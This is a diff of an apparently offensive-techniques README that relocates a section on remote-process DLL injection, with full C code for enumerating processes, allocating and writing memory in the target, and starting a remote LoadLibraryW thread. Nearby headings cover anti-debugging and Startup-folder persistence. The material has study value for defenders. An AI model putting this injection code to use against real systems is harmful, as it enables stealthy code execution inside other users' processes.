@@ -328,6 +328,185 @@ Then it -
 - Sets the result to `TRUE` if the file was successfully deleted.
 - Closes the file handle and returns the result.
 
+## Remote process Dll Injection
+-------
+![image](https://github.com/user-attachments/assets/e3003b2d-2815-4314-9ab7-46dcba66dada)
+
+The remote process Dll Injection takes place through two different functions. -
+
+### `GetRemoteProcessHandle` Function
+
+The `GetRemoteProcessHandle` function enumerates processes and gets the handle of a specified remote process. Here is a detailed explanation of how the function works:
+
+#### Parameters
+- `szProcessName`: The name of the process to find.
+- `dwProcessID`: A pointer to store the process ID of the found process.
+- `hProcess`: A pointer to store the handle of the found process.
+
+#### Detailed Steps
+
+1. **Initialize the Process Entry Structure**:
+   - Initializes a `PROCESSENTRY32` structure to store information about the processes.
+
+`PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };`
+
+2. **Initialize Variables**:
+- Initializes a variable for the snapshot handle.
+
+`HANDLE hSnapShot = NULL;`
+
+3. **Get the Snapshot of the Processes**:
+- Creates a snapshot of the processes using `CreateToolhelp32Snapshot`.
+- If the snapshot creation fails, prints an error message and jumps to the cleanup section.
+
+```C
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapShot == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %d\n", GetLastError());
+		goto _EndOfFunction;
+	}
+```
+
+4. **Read the First Process**:
+- Retrieves information about the first process in the snapshot using `Process32First`.
+- If the retrieval fails, prints an error message and jumps to the cleanup section.
+
+```C
+	if (!Process32First(hSnapShot, &Proc)) {
+		printf("[!] Process32First Failed With Error Code: %d\n", GetLastError());
+		goto _EndOfFunction;
+	}
+```
+
+5. **Read the Remaining Processes**:
+- Iterates through the remaining processes in the snapshot using `Process32Next`.
+- If the process name matches the specified process name, retrieves the process ID and opens a handle to the process using `OpenProcess`.
+- If the handle opening fails, prints an error message.
+
+```C
+	//Read The Remaining Processes
+	do {
+		// If the process name matches the required process name
+		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
+			// Get the process ID
+			*dwProcessID = Proc.th32ProcessID;
+			//Open a handle to the process
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessID);
+			if (*hProcess == NULL) {
+				printf("[!] OpenProcess Failed With Error Code: %d\n", GetLastError());
+			}
+			break;
+		}
+	} while (Process32Next(hSnapShot, &Proc));
+```
+
+
+6. **Cleanup and Return**:
+- Closes the snapshot handle and returns `TRUE` if the process was found and the handle was successfully opened, `FALSE` otherwise.
+
+```C
+_EndOfFunction:
+	if (hSnapShot != NULL)
+		CloseHandle(hSnapShot);
+	if (*dwProcessID == NULL || *hProcess == NULL)
+		return FALSE;
+	return TRUE;
+```
+
+### `InjectDllToRemoteProcess` Function
+
+The `InjectDllToRemoteProcess` function injects a DLL into a remote process. Here is a detailed explanation of how the function works:
+
+#### Parameters
+- `hProcess`: The handle of the remote process.
+- `DllName`: The name of the DLL to be injected.
+
+#### Detailed Steps
+
+1. **Initialize Variables**:
+- Initializes variables for the state, the address of `LoadLibraryW`, and the address in the remote process.
+```C
+	BOOL		bSTATE = TRUE;
+	LPVOID		pLoadLibraryW = NULL;
+	LPVOID		pAddress = NULL;
+```
+
+2. **Fetch the Size of the DLL Name**:
+- Calculates the size of the DLL name in bytes.
+```C
+	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
+	SIZE_T		lpNumberOfBytesWritten = NULL;
+	HANDLE		hThread = NULL;
+```
+
+3. **Load `LoadLibraryW` Function**:
+- Retrieves the handle of `kernel32.dll` using `GetModuleHandle`.
+- If the handle retrieval fails, prints an error message and jumps to the cleanup section.
+- Retrieves the address of `LoadLibraryW` using `GetProcAddress`.
+- If the address retrieval fails, prints an error message and jumps to the cleanup section.
+```C
+	//Opening a handle to kernel32.dll
+    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
+    if (hKernel32 == NULL) {
+        printf("[!] GetModuleHandle Failed With Error Code: %d\n", GetLastError());
+        bSTATE = FALSE;
+        goto _EndOfFunction;
+    }
+
+	// Get the address of LoadLibraryW and loading it
+    pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
+    if (pLoadLibraryW == NULL) {
+        printf("[!] GetProcAddress Failed With Error Code: %d\n", GetLastError());
+        bSTATE = FALSE;
+        goto _EndOfFunction;
+    }
+```
+
+4. **Allocate Memory in the Remote Process**:
+- Allocates memory in the remote process using `VirtualAllocEx`.
+- If the memory allocation fails, prints an error message and jumps to the cleanup section.
+```C
+	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf("[!] VirtualAllocEx Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+```
+
+5. **Write the DLL Name to the Allocated Memory**:
+- Writes the DLL name to the allocated memory in the remote process using `WriteProcessMemory`.
+- If the memory writing fails, prints an error message and jumps to the cleanup section.
+```C
+	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
+		printf("[!] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+```
+
+6. **Create a Remote Thread to Load the DLL**:
+- Creates a remote thread in the remote process to load the DLL using `CreateRemoteThread`.
+- If the thread creation fails, prints an error message and jumps to the cleanup section.
+```C
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+	if (hThread == NULL) {
+		printf("[!] CreateRemoteThread Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+```
+
+7. **Cleanup and Return**:
+- Closes the thread handle and returns the state (`TRUE` if successful, `FALSE` otherwise).
+```C
+_EndOfFunction:
+	if (hThread) {
+		CloseHandle(hThread);
+	}
+	return bSTATE;
+```
+
 ## Anti-Debugging Using TLS Callbacks
 ---------
 TLS callbacks are a set of callback functions specified within the TLS directory of a PE file, these callbacks are executed by the Windows loader before thread creation, meaning that a TLS callback can be executed before the main thread. From an anti-analysis perspective, TLS callbacks can be used to check if the implementation is being analyzed before executing the main function.
@@ -561,185 +740,6 @@ if (((uAddress >> 8) & 0xFF) > 0xFFFF) {
 if (!HeapFree(GetProcessHeap(), 0x00, uAddress)) {
 	return;
 }
-```
-
-## Remote process Dll Injection
--------
-![image](https://github.com/user-attachments/assets/e3003b2d-2815-4314-9ab7-46dcba66dada)
-
-The remote process Dll Injection takes place through two different functions. -
-
-### `GetRemoteProcessHandle` Function
-
-The `GetRemoteProcessHandle` function enumerates processes and gets the handle of a specified remote process. Here is a detailed explanation of how the function works:
-
-#### Parameters
-- `szProcessName`: The name of the process to find.
-- `dwProcessID`: A pointer to store the process ID of the found process.
-- `hProcess`: A pointer to store the handle of the found process.
-
-#### Detailed Steps
-
-1. **Initialize the Process Entry Structure**:
-   - Initializes a `PROCESSENTRY32` structure to store information about the processes.
-
-`PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };`
-
-2. **Initialize Variables**:
-- Initializes a variable for the snapshot handle.
-
-`HANDLE hSnapShot = NULL;`
-
-3. **Get the Snapshot of the Processes**:
-- Creates a snapshot of the processes using `CreateToolhelp32Snapshot`.
-- If the snapshot creation fails, prints an error message and jumps to the cleanup section.
-
-```C
-	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (hSnapShot == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %d\n", GetLastError());
-		goto _EndOfFunction;
-	}
-```
-
-4. **Read the First Process**:
-- Retrieves information about the first process in the snapshot using `Process32First`.
-- If the retrieval fails, prints an error message and jumps to the cleanup section.
-
-```C
-	if (!Process32First(hSnapShot, &Proc)) {
-		printf("[!] Process32First Failed With Error Code: %d\n", GetLastError());
-		goto _EndOfFunction;
-	}
-```
-
-5. **Read the Remaining Processes**:
-- Iterates through the remaining processes in the snapshot using `Process32Next`.
-- If the process name matches the specified process name, retrieves the process ID and opens a handle to the process using `OpenProcess`.
-- If the handle opening fails, prints an error message.
-
-```C
-	//Read The Remaining Processes
-	do {
-		// If the process name matches the required process name
-		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
-			// Get the process ID
-			*dwProcessID = Proc.th32ProcessID;
-			//Open a handle to the process
-			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessID);
-			if (*hProcess == NULL) {
-				printf("[!] OpenProcess Failed With Error Code: %d\n", GetLastError());
-			}
-			break;
-		}
-	} while (Process32Next(hSnapShot, &Proc));
-```
-
-
-6. **Cleanup and Return**:
-- Closes the snapshot handle and returns `TRUE` if the process was found and the handle was successfully opened, `FALSE` otherwise.
-
-```C
-_EndOfFunction:
-	if (hSnapShot != NULL)
-		CloseHandle(hSnapShot);
-	if (*dwProcessID == NULL || *hProcess == NULL)
-		return FALSE;
-	return TRUE;
-```
-
-### `InjectDllToRemoteProcess` Function
-
-The `InjectDllToRemoteProcess` function injects a DLL into a remote process. Here is a detailed explanation of how the function works:
-
-#### Parameters
-- `hProcess`: The handle of the remote process.
-- `DllName`: The name of the DLL to be injected.
-
-#### Detailed Steps
-
-1. **Initialize Variables**:
-- Initializes variables for the state, the address of `LoadLibraryW`, and the address in the remote process.
-```C
-	BOOL		bSTATE = TRUE;
-	LPVOID		pLoadLibraryW = NULL;
-	LPVOID		pAddress = NULL;
-```
-
-2. **Fetch the Size of the DLL Name**:
-- Calculates the size of the DLL name in bytes.
-```C
-	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
-	SIZE_T		lpNumberOfBytesWritten = NULL;
-	HANDLE		hThread = NULL;
-```
-
-3. **Load `LoadLibraryW` Function**:
-- Retrieves the handle of `kernel32.dll` using `GetModuleHandle`.
-- If the handle retrieval fails, prints an error message and jumps to the cleanup section.
-- Retrieves the address of `LoadLibraryW` using `GetProcAddress`.
-- If the address retrieval fails, prints an error message and jumps to the cleanup section.
-```C
-	//Opening a handle to kernel32.dll
-    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
-    if (hKernel32 == NULL) {
-        printf("[!] GetModuleHandle Failed With Error Code: %d\n", GetLastError());
-        bSTATE = FALSE;
-        goto _EndOfFunction;
-    }
-
-	// Get the address of LoadLibraryW and loading it
-    pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
-    if (pLoadLibraryW == NULL) {
-        printf("[!] GetProcAddress Failed With Error Code: %d\n", GetLastError());
-        bSTATE = FALSE;
-        goto _EndOfFunction;
-    }
-```
-
-4. **Allocate Memory in the Remote Process**:
-- Allocates memory in the remote process using `VirtualAllocEx`.
-- If the memory allocation fails, prints an error message and jumps to the cleanup section.
-```C
-	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (pAddress == NULL) {
-		printf("[!] VirtualAllocEx Failed With Error Code: %d\n", GetLastError());
-		bSTATE = FALSE;
-		goto _EndOfFunction;
-	}
-```
-
-5. **Write the DLL Name to the Allocated Memory**:
-- Writes the DLL name to the allocated memory in the remote process using `WriteProcessMemory`.
-- If the memory writing fails, prints an error message and jumps to the cleanup section.
-```C
-	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
-		printf("[!] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
-		bSTATE = FALSE;
-		goto _EndOfFunction;
-	}
-```
-
-6. **Create a Remote Thread to Load the DLL**:
-- Creates a remote thread in the remote process to load the DLL using `CreateRemoteThread`.
-- If the thread creation fails, prints an error message and jumps to the cleanup section.
-```C
-	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
-	if (hThread == NULL) {
-		printf("[!] CreateRemoteThread Failed With Error Code: %d\n", GetLastError());
-		bSTATE = FALSE;
-		goto _EndOfFunction;
-	}
-```
-
-7. **Cleanup and Return**:
-- Closes the thread handle and returns the state (`TRUE` if successful, `FALSE` otherwise).
-```C
-_EndOfFunction:
-	if (hThread) {
-		CloseHandle(hThread);
-	}
-	return bSTATE;
 ```
 
 ## Persistence Using Startup Folder
